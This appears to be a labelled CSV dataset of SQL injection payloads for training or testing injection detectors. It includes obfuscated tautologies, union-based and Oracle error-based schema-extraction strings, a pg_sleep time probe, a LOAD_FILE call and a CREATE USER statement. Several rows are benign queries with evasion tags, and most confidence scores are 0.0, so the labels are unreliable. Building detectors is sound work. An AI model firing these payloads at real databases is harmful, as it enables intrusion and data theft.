payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
1 uni/**/on select all from where,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_csv,unknown
uni/**/on sel/**/ect,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_csv,unknown
'/**/or/**/1/**/ = /**/1,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_csv,unknown
/**/or/**/1/**/ = /**/1,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_csv,unknown
"SELECT CustomerName, /*City,*/ Country FROM Customers;",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv3_csv,unknown
SELECT * FROM Customers WHERE ( CustomerName LIKE 'L%' OR CustomerName LIKE 'R%' /*OR CustomerName LIKE 'S%' OR CustomerName LIKE 'T%'*/ OR CustomerName LIKE 'W%' ) AND Country = 'USA' ORDER BY CustomerName,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv3_csv,string_single_quote
""" oR Pg_SlEEp ( __tIMe__* )`[ANd True/**/AND<0O0b0B1110100011011010100111000111011110100001!lIke 0b0x0b1011A1/*(P*/||_0X4X0o0o0>}&& TRUe ANd tRuE and tRue --",unknown,postgresql,comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
create user name/**/identified by pass0o173 temporary tablespace temp default tablespace users,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"_ AND (selECT (seleCt (sELEct (SEleCt (seLECT 0x2))))) LiKe uTL_iNadDr.gET_hoSt_ADdRESs ( ( SeLEct dIStINct (/*:H*/ tabLe_name ) From ( sELect diSTInCt ( anD (SELeCT (SElecT (SeLECt 2))) aNd tRUE#tablE_NAme $) , RoWNUm AS;limiT fRom Sys.All_TaBLES ) WHERE liMIT~ LIke 0O0x5x0B101X5, ) [ ) And 'i' lIKE 'IIzPO?c",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"sElect * FrOM userS WhERe id='9' oR.@ @(sElect (SeLecT (SeLecT (SeLECt 1))))&/*S7;t*/= 1 UnioN SeLEct (SELECT (SELECT 1)),vERSiOn: ( ) AND '5' not Like '0x7;' aNd TRUe Or fAlSE'anD ""&"" lIKe ""&"" OR False -- 1'A{3F",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"sEleCT * frOM/**/usErS whERE/*DnPD;R*/Id=(seLEct (sElect (SELECT (SELECT 1)))) Or (sElECt 0X1) Or fAlSE Or FaLSE OR ""He"" NOT LIKE ""He"" OR False#"" ( UNioN SelECT (SeLEcT 0b1),vERSION ( :), -- 0x0x",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"7; ( %loAD_fILe;<(&\ChaR* ( _(sElect;0b10x3F),(seLecT (SelECT~(SELEct (sELEct 101)))),0x74,0X0b111115,0X11,0b0b0x0O0X70,(SElEcT (sElECt 5X61)),8X0O111,0X73,0X7x46,(SElEcT (SeLecT (SelECt<0xC8))) )_ &)/*(>o6x.^_{ 16_OOY*/ ~)"",,(sEleCt^(seLECT/**/(selEcT.2B1))),7x0O0,5X4O7X0x0x6B8;",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
? or=7B0X4x0x0X8 {=/*5JaZ*/ 0x4 Or FALse_or fALsE}or FAlsE --,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
)<< oR] &( `'A'} =/*t<Z0b0b0B10o5za E*/ 'a,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"ANd (SeLEct (SeLECT (SeLECT (selECt (seleCt (SEleCT (SELECT (seLeCt (SELECT 7))))))))) = Utl_inADdr.gET_HOSt_aDDRESS ( ( sElect dIstiNCT ( COluMn_NAMe ) FroM ( SeLeCT DiStInCt ( /**/cOluMn_nAMe ) , ROWnUM aS limIt From aLL_TAb_ColUMns ) = WHeRe liMIT = 0B41 ) ) AND'i' = 'i",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SELECt}(Qv q*/FrOm]uSeRS wHeRe Id='5b0xa' %!<@ uNiOn seLecT 3O1O5,vErsION% (/**/ ) aNd TRUe> && :tRUE?ANd (sELect 0x0o0O0x0O6) oR (SeLEct (sElECt (SeLeCt (SELECT 0)))) oR FalsE -- 0'Emv. U",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SElEcT?* FroM+uSERs WhERE;iD\ LiKE 0B18 OR ""& (& ""/*ujT|<GURzkF*/or~0b1 likE ]0b0o9 or 0x0 OR FAlSe OR FALSe and (sElect 9348)<>(SeLEcT 9349) -- 7",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
